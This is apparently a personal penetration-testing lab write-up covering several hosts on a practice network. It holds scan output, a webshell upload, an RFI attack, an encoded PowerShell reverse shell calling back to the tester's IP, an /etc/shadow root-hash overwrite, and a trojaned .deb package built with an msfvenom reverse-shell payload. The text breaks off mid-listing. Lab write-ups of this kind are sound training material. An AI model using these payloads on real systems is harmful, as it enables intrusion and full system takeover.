## This note contains pwning from beginning to the end of every targets. 

![image](https://github.com/user-attachments/assets/249c6f61-b546-4373-b86e-49ac71dfa42a)

> first discover targets in the platform ranging from .10 - .254. I have script to look for targets in a subnet or multiple subnet

```python
import subprocess
import concurrent.futures


# List of network ranges to scan
networks = [
   "10.150.150.0/22"]


# Files to write live hosts and web hosts
output_file = "alive_hosts.txt"
web_hosts_file = "web_hosts.txt"


# Function to scan a single network and write results to a file
def scan_network(network):
   try:
       print(f"Scanning network: {network}")
       result = subprocess.run(
           ["fping", "-a", "-g", network],
           stdout=subprocess.PIPE,
           stderr=subprocess.PIPE,
           text=True
       )


       output = result.stdout.strip()
       if output:
           with open(output_file, "a") as f:
               f.write(f"Live hosts in {network}:\n{output}\n\n")
           print(f"Live hosts written to {output_file}")
           return output.splitlines()  # Return live hosts as a list
       else:
           print(f"No live hosts found in {network}")
           return []


   except Exception as e:
       print(f"Error scanning {network}: {e}")
       return []


# Function to run httpx on a single host
def run_httpx(host):
   try:
       print(f"Running httpx on: {host}")
       result = subprocess.run(
           ["httpx", "-title", "-sc", "-cl", host],
           stdout=subprocess.PIPE,
           stderr=subprocess.PIPE,
           text=True
       )


       output = result.stdout.strip()
       if output:
           with open(web_hosts_file, "a") as f:
               f.write(f"Results for {host}:\n{output}\n\n")
           print(f"Results for {host} written to {web_hosts_file}")


   except Exception as e:
       print(f"Error running httpx on {host}: {e}")


# Main function to run the network scan and httpx in parallel
def main():
   with open(output_file, "w") as f:
       f.write("Live Hosts Scan Results:\n\n")


   with open(web_hosts_file, "w") as f:
       f.write("Web Hosts Scan Results:\n\n")


   max_workers = 10  # Number of concurrent workers (threads)


   with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
       futures = [executor.submit(scan_network, network) for network in networks]
       live_hosts = []
       for future in concurrent.futures.as_completed(futures):
           try:
               hosts = future.result()
               live_hosts.extend(hosts)
           except Exception as e:
               print(f"Error: {e}")


   print("Network scan complete. Results saved in", output_file)


   # Run httpx on live hosts in parallel
   if live_hosts:
       with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
           httpx_futures = [executor.submit(run_httpx, host) for host in live_hosts]
           for future in concurrent.futures.as_completed(httpx_futures):
               try:
                   future.result()
               except Exception as e:
                   print(f"Error: {e}")


if __name__ == "__main__":
   main()

```


> Running the script to discover targets

![image](https://github.com/user-attachments/assets/df25bf2a-b4db-4811-950c-35f3c6342b72)

> Using fping to check for targets in the suibnet

```bash
fping -a -g 10.150.150.0/22 2>/dev/null > ips.txt 

┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD]
└─$ cat ips.txt 
10.150.150.2
10.150.150.11
10.150.150.12
10.150.150.15
10.150.150.17
10.150.150.18
10.150.150.21
10.150.150.27
10.150.150.38
10.150.150.48
10.150.150.55
10.150.150.56
10.150.150.57
10.150.150.59
10.150.150.66
10.150.150.69
10.150.150.100
10.150.150.113
10.150.150.122
10.150.150.123
10.150.150.129
10.150.150.130
10.150.150.134
10.150.150.135
10.150.150.136
10.150.150.137
10.150.150.138
10.150.150.145
10.150.150.146
10.150.150.147
10.150.150.150
10.150.150.166
10.150.150.178
10.150.150.181
10.150.150.182
10.150.150.188
10.150.150.193
10.150.150.199
10.150.150.202
10.150.150.212
10.150.150.219
10.150.150.222
10.150.150.224
10.150.150.226
10.150.150.232
10.150.150.242
```



> Discovering windows devices using net exec


```bash
nxc smb 10.150.150.0/22
```

![image](https://github.com/user-attachments/assets/96009369-fe6e-4ddb-9bb7-7b567acbef4e)



## Checking for common network smb vulns 

> Checking for targets vuln to eternalblue using net exec 

```bash
nxc smb 10.150.150.0/22 -M ms17-010 2>/dev/null
```

![image](https://github.com/user-attachments/assets/82fa052d-2f3d-4e30-a82e-2fc103d2af6e)

we can see the targets below are vulnerable to eternalblue 

```
10.150.150.11
10.150.150.242
```



# Exploiting targets 

## 10.150.150.11 (pwndrive)

> first enum with nmap, first we do full port scan

```bash
# Nmap 7.94SVN scan initiated Sun May 18 20:47:07 2025 as: /usr/lib/nmap/nmap --privileged -p- --min-rate 1000 -v -Pn -oN 11.txt 10.150.150.11
Nmap scan report for 10.150.150.11
Host is up (0.35s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49192/tcp open  unknown

Read data files from: /usr/share/nmap
# Nmap done at Sun May 18 20:48:33 2025 -- 1 IP address (1 host up) scanned in 85.77 seconds
```


> running nmap default script scans

```bash
# Nmap 7.94SVN scan initiated Sun May 18 20:50:55 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p21,80,135,139,443,445,1433,3306,3389 -Pn -oN 11_service.txt 10.150.150.11
Nmap scan report for 10.150.150.11
Host is up (0.20s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Xlight ftpd 3.9
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
|_ssl-date: TLS randomness does not represent time
|_http-title: PwnDrive - Your Personal Online Storage
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2012 11.00.2100.00; RTM
| ms-sql-ntlm-info: 
|   10.150.150.11:1433: 
|     Target_Name: PWNDRIVE
|     NetBIOS_Domain_Name: PWNDRIVE
|     NetBIOS_Computer_Name: PWNDRIVE
|     DNS_Domain_Name: PwnDrive
|     DNS_Computer_Name: PwnDrive
|_    Product_Version: 6.1.7601
|_ssl-date: 2025-05-18T19:12:47+00:00; -38m33s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-21T12:57:09
|_Not valid after:  2054-03-21T12:57:09
| ms-sql-info: 
|   10.150.150.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3306/tcp open  mysql        MySQL 5.5.5-10.4.14-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.14-MariaDB
|   Thread ID: 587
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, InteractiveClient, FoundRows, LongColumnFlag, ODBCClient, SupportsLoadDataLocal, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: pw&TS%]%=F&,IhRB4z-m
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  tcpwrapped
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 45m27s, deviation: 3h07m50s, median: -38m33s
| smb2-time: 
|   date: 2025-05-18T19:12:36
|_  start_date: 2024-03-21T12:57:13
|_nbstat: NetBIOS name: PWNDRIVE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:87:cb (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: PwnDrive
|   NetBIOS computer name: PWNDRIVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-18T12:12:37-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 18 20:51:23 2025 -- 1 IP address (1 host up) scanned in 27.70 seconds

```


> enumerating port 80 

![image](https://github.com/user-attachments/assets/a925a723-a008-497c-a305-cf54e6c1b1ea)

we can see the web service is up and running 

![image](https://github.com/user-attachments/assets/744df946-c914-4b33-ba60-78f3f4dbe8ed)

clicked the signin button to login, trying default creds. 


![image](https://github.com/user-attachments/assets/76f5e383-4760-4a21-b5d9-88d590774272)

we loging using `admin:admin` credential. we can see a cmd.php file. 

![image](https://github.com/user-attachments/assets/c144bd7e-2538-4623-b6d7-90095d2f5d7f)

we create a new dir and upload file webshell.php

![image](https://github.com/user-attachments/assets/b4ceb5c9-4cc4-46eb-80a1-63203a002670)

use feroxbuster to discover the path where the shell is uploaded to. 

![image](https://github.com/user-attachments/assets/beb52d8a-adbc-420a-aa54-0f732d138afd)

we got RCE and executed whoami as user `nt authority\system`


![image](https://github.com/user-attachments/assets/3c149b10-d7d2-4a3c-8384-6398d564c85c)

> let's pop reverse shell 


```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANgA2AC4ANgA3AC4ANQA4ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

![image](https://github.com/user-attachments/assets/6422adcc-8614-48aa-95ae-a7e9676dca11)

we got a reverse shell as `nt auth/system`.



> exploiting the eternal blue vuln (MS17-010) - T0DO

![image](https://github.com/user-attachments/assets/eefd389b-659f-4fd3-bf1e-3716d5e96c77)

found an exploit on github 

> running the exploit

![image](https://github.com/user-attachments/assets/f6baf65f-6149-4f8e-b93e-7d88b302d1bf)

we got shell as user `nt auth/system`

![image](https://github.com/user-attachments/assets/5c20cb00-ad0d-4655-b507-114a863a17f5)

easy peasy 🙂



# 10.150.150.12 

>first enum with nmap

```bash
# Nmap 7.94SVN scan initiated Sun May 18 21:34:18 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p21,22 -Pn -oN 12_service.txt 10.150.150.12
Nmap scan report for 10.150.150.12
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.66.67.58
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1f:bc:e3:e3:5b:eb:ff:b2:30:a7:4c:33:11:bf:67:a3 (RSA)
|   256 c8:e4:18:29:59:d0:4e:ea:dc:05:50:bc:d5:6f:e5:00 (ECDSA)
|_  256 58:d5:70:6d:0d:80:71:0a:ba:8e:1c:7a:c7:37:2f:e2 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 18 21:34:36 2025 -- 1 IP address (1 host up) scanned in 17.86 seconds
```

> enum port 21 (ftp)





# 10.150.150.17 (Overload)

> first enum with nmap

```bash
# Nmap 7.94SVN scan initiated Mon May 19 15:21:43 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p21,22,25,53,80,389,33060 -Pn -oN 17_service.txt 10.150.150.17
Nmap scan report for 10.150.150.17
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f9:30:f8:ef:be:da:2d:42:0d:34:ee:21:4b:2f:4a:8e (RSA)
|   256 fd:f4:aa:82:76:9a:5d:6a:c2:9b:ad:e7:04:db:82:0e (ECDSA)
|_  256 4b:b4:6f:90:1a:f2:76:38:3c:de:04:50:83:e7:55:f0 (ED25519)
25/tcp    open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=overload
| Subject Alternative Name: DNS:overload
| Not valid before: 2020-08-01T15:05:31
|_Not valid after:  2030-07-30T15:05:31
|_smtp-commands: overload.fritz.box, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
53/tcp    open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
389/tcp   open  ldap    OpenLDAP 2.2.X - 2.3.X
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   LDAPSearchReq, NotesRPC, X11Probe: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: Host:  overload.fritz.box; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 19 15:23:29 2025 -- 1 IP address (1 host up) scanned in 105.81 seconds

```

> enum port 80

![image](https://github.com/user-attachments/assets/7addf71e-2add-497b-abba-4d845a1c96f6)

we can see the vhost `overload.ptd`.


![image](https://github.com/user-attachments/assets/26c1e387-de4a-49dc-9c69-69979c9a1a2f)

add `overload.ptd` to `/etc/hosts` file. 

> fuzzing for vhosts using ffuf

```bash
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.overload.ptd" -u http://10.150.150.17 -fs 13

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.150.150.17
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.overload.ptd
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13
________________________________________________

administrator           [Status: 200, Size: 22826, Words: 1075, Lines: 304, Duration: 856ms]
database                [Status: 200, Size: 14762, Words: 2348, Lines: 221, Duration: 8889ms]
e-commerce              [Status: 200, Size: 28256, Words: 6741, Lines: 480, Duration: 695ms]
drupal                  [Status: 200, Size: 8822, Words: 1512, Lines: 232, Duration: 304ms]
shop                    [Status: 200, Size: 24769, Words: 4444, Lines: 364, Duration: 8605ms]
wordpress               [Status: 200, Size: 25966, Words: 1204, Lines: 346, Duration: 7512ms]
:: Progress: [151265/151265] :: Job [1/1] :: 203 req/sec :: Duration: [0:12:55] :: Errors: 1 ::
```


![image](https://github.com/user-attachments/assets/688ef9f3-2730-4a68-ba4a-3ef8e79acb07)

Add every vhost discovered to `/etc/hosts` file. 


> **T0-DO**




# 10.150.150.18 (Snare)

> first enum with nmap

```bash
# Nmap 7.94SVN scan initiated Tue May 20 22:06:36 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p22,80 -Pn -oN 18_service.txt 10.150.150.18
Nmap scan report for 10.150.150.18
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:0e:73:d4:ae:73:14:7e:c5:1c:15:84:ef:45:a4:d1 (RSA)
|   256 39:0b:0b:c9:86:c9:8e:b5:2b:0c:39:c7:63:ec:e2:10 (ECDSA)
|_  256 f6:bf:c5:03:5b:df:e5:e1:f4:da:ac:1e:b2:07:88:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Welcome to my homepage!
|_Requested resource was /index.php?page=home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 20 22:06:50 2025 -- 1 IP address (1 host up) scanned in 13.31 seconds
```


> checking out the web application

![image](https://github.com/user-attachments/assets/f0718b54-d912-494c-8ce9-6678603718a5)

> checking out the endpoint

![image](https://github.com/user-attachments/assets/d8bfaa80-e46d-4cc3-9bbb-895825056569)

we can see a potential endpoint for LFI or RFI 

> fuzzing for lfi using payloads

![image](https://github.com/user-attachments/assets/6ea27a67-275a-4371-85ac-627055064533)

no luck in fuzzing for lfi, let's try rfi 

![image](https://github.com/user-attachments/assets/9ea8f324-cc6e-4599-8df8-0d982bbaf420)

Trying rfi

![image](https://github.com/user-attachments/assets/3ddbcd6f-ce51-4333-991e-7397ad07a207)

we got a request on our http server. it appends `.php` to the end of every file requested. let's create a php shell 

> make request to the shell

![image](https://github.com/user-attachments/assets/4562d427-0da3-4efb-b1e2-29ca87d5919c)

> check back our terminal, we can see we got a shell

![image](https://github.com/user-attachments/assets/32a08382-ebc1-4ac8-b584-d8bb2dfe6acb)


### Privilege Escalation 

> checking for writeable `/etc` files

```bash
www-data@snare:/tmp$ find /etc/ -type f -writable 2>/dev/null
/etc/shadow
www-data@snare:/tmp$
```
we can see we have write access to the `/etc/shadow` file.

> Exploiting writable `/etc/shadow` file

![image](https://github.com/user-attachments/assets/2798249a-7e52-4100-96b6-7ce2a66ff17b)

check the content of the `/etc/shadow` file, we can see root hash

```
root:$6$b8wkwLbICzuTqPiO$dFLYb8ZNEpfGLRnvODlyGfjtZQTV85FJCDCBGiZEU9b3laym9RJo144xkYEldB419O1Q3E5FARrKRRn/LrtZc0:18586:0:99999:7:::
```

![image](https://github.com/user-attachments/assets/92f11d65-9a6a-4ad9-9ae0-7df9926bc80b)

```
$6$X2OxC7wg31bWpbtT$krRWSN9Us0d5f5hZqRSKJBdwppmyPcGkMSKULarhiC5Qe/Nk5azDzmLDu9kkbs44vuzyeRocZFUO/tXA70cr/1
```

![image](https://github.com/user-attachments/assets/03be9d32-dc8c-4a1c-99cf-7d1212d71fcc)

replace the hash with the new hash generated.

![image](https://github.com/user-attachments/assets/bb2b16e5-dbe4-475e-a558-a679fd1b0535)

su user root using the password created, and we got root.

![image](https://github.com/user-attachments/assets/6d4eb048-eb2b-441e-9786-a9fd8c8e69da)

We pwned it 😸 easy peasy!






# 10.150.150.21 (Japan Town)

> First enum with nmap

```bash
# Nmap 7.94SVN scan initiated Tue May 20 23:12:36 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p22,80 -Pn -oN 21_service.txt 10.150.150.21
Nmap scan report for 10.150.150.21
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8e:76:47:5b:e4:5e:ac:c4:f3:37:7f:ab:03:8d:15:20 (RSA)
|   256 f9:d4:01:a0:71:ee:66:ae:d6:dc:c4:39:2d:ab:04:c4 (ECDSA)
|_  256 f4:4c:5d:62:f1:d1:04:f6:7f:ea:bb:ee:82:d9:9b:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Japantown &#8211; &#8211; experience &amp; live Asia
|_http-generator: WordPress 5.3.6
| http-robots.txt: 1 disallowed entry 
|_*/2020/12/you-know-what-this-is-for.png
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 20 23:12:50 2025 -- 1 IP address (1 host up) scanned in 13.79 seconds
```

> enum web service

![image](https://github.com/user-attachments/assets/9174d25e-77c4-4e09-95f1-785f215026a9)

we can see it is running a wordpress 

![image](https://github.com/user-attachments/assets/3aad5faf-f63d-4ec7-8755-611ca6b2f46a)

checking the author post,he's talking ablout depixlating tool and the password has been blurred. let's unblurr it

![image](https://github.com/user-attachments/assets/186d0eb5-4610-474a-a477-8beec32611fb)

checking robots.txt, we got a path to an image file. 

![image](https://github.com/user-attachments/assets/232ca6d8-0a0c-4b93-a306-5dee83033bbe)

checking the path robots.txt showed us, Let's download.

![image](https://github.com/user-attachments/assets/0f852b5b-89f2-4d29-b3a7-def861ce82ea)

found a tool on github. 

![image](https://github.com/user-attachments/assets/5820ae98-4e8e-41e8-9bd5-954a5d84642f)

image to get plain text. 

![image](https://github.com/user-attachments/assets/6fc87043-af99-4723-87db-1d702db3f199)

download the file, decode it from base64, send the output to another file, we got a png file. let's use it in depixlating the image.

![image](https://github.com/user-attachments/assets/27614704-800d-4f38-a62c-e1d2e48cfebf)

depixlating is very hard, i'd just give the password `kiminchina4`. 

![image](https://github.com/user-attachments/assets/b56b6922-14e6-42db-9296-a30ecf299715)

login to `wp-admin` page 

![image](https://github.com/user-attachments/assets/419ae42b-8c36-4ab0-ac36-923d6c74715c)

login success. 

![image](https://github.com/user-attachments/assets/db05c20f-bb8f-4ecd-920d-9911d7cbb0b8)

edit the `404.php` of the theme `twentynineteen`. 

![image](https://github.com/user-attachments/assets/8921b16e-68bd-4bc4-a844-7866ce3dafab)

navigate to the path `10.150.150.21/wp-content/themes/twentynineteen/404.php?cmd=whoami` to trigger webshell.

> Rev Shell

![image](https://github.com/user-attachments/assets/84209f9d-ea0d-448f-b216-736ca8d155e8)

### Privilege Escalation

![image](https://github.com/user-attachments/assets/0bc78033-8ea1-4006-8e7a-24efb9ba23fe)

running `pspy` we can see a cron job running as root to download and install the deb file. 

> creating a malicious deb file

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
└─$ wget http://de.archive.ubuntu.com/ubuntu/pool/main/o/openssh/ssh_8.2p1-4_all.deb 
--2025-05-25 12:56:19--  http://de.archive.ubuntu.com/ubuntu/pool/main/o/openssh/ssh_8.2p1-4_all.deb
Resolving de.archive.ubuntu.com (de.archive.ubuntu.com)... 141.30.62.24, 141.30.62.26, 141.30.62.25, ...
Connecting to de.archive.ubuntu.com (de.archive.ubuntu.com)|141.30.62.24|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5072 (5.0K) [application/vnd.debian.binary-package]
Saving to: ‘ssh_8.2p1-4_all.deb’

ssh_8.2p1-4_all.deb                                                            100%[====================================================================================================================================================================================================>]   4.95K  --.-KB/s    in 0.001s  

2025-05-25 12:56:25 (5.05 MB/s) - ‘ssh_8.2p1-4_all.deb’ saved [5072/5072]
                                            
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
└─$ ls -al 
total 16
drwxrwxr-x 2 n16hth4wk n16hth4wk 4096 May 25 12:56 .
drwxrwxr-x 7 n16hth4wk n16hth4wk 4096 May 25 12:24 ..
-rw-rw-r-- 1 n16hth4wk n16hth4wk 5072 Feb 26  2020 ssh_8.2p1-4_all.deb
```
first download the deb file. 

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
└─$ mkdir work                                  
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
└─$ dpkg -x ssh_8.2p1-4_all.deb work
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/Exploit/mal_deb]
└─$ cd work   
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PTD/Exploit/mal_deb/work]
└─$ mkdir DEBIAN
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PTD/Exploit/mal_deb/work]
└─$ ls -al 
total 16
drwxr-xr-x 4 n16hth4wk n16hth4wk 4096 May 25 12:58 .
drwxrwxr-x 3 n16hth4wk n16hth4wk 4096 May 25 12:57 ..
drwxrwxr-x 2 n16hth4wk n16hth4wk 4096 May 25 12:58 DEBIAN
drwxr-xr-x 3 n16hth4wk n16hth4wk 4096 Feb 26  2020 usr
```
extract the deb file to a director which `work` was created for. then create another directory `DEBIAN` 

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PTD/Exploit/mal_deb/work]
└─$ cd DEBIAN            

┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/Exploit/mal_deb/work/DEBIAN]
└─$ nano control                                            

┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/Exploit/mal_deb/work/DEBIAN]
└─$ cat control                                           
Package: ssh
Version: 8.2p1
Section: Secure Shell
Priority: optional
Architecture: all
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Description: ssh - secure shell client and server (metapackage)
 This metapackage is a convenient way to install both the OpenSSH client
 and the OpenSSH server. It provides nothing in and of itself, so you
 may remove it if nothing depends on it.
```
In the DEBIAN directory, create a file named control that contains the above. We also need to create a post-installation script that will execute our binary. In our DEBIAN directory, we’ll create a file named postinst that contains the following:

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/Exploit/mal_deb/work/DEBIAN]
└─$ cat postinit 
#!/bin/sh

sudo chmod 2755 /usr/games/ssh_8.2p1-4_all && /usr/games/ssh_8.2p1-4_all & /usr/games/ssh_8.2p1-4_all &
```
now let's create a reverse shell

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PTD/Exploit/mal_deb/work]
└─$ cd usr/games 
                                                                                                                                                                                                                                                                                                                            
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/mal_deb/work/usr/games]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.66.67.58 LPORT=443 -f elf -o  	ssh_8.2p1-4_all        
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: ssh
                                                                    
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/mal_deb/work/usr/games]
└─$ ls -al 
total 12
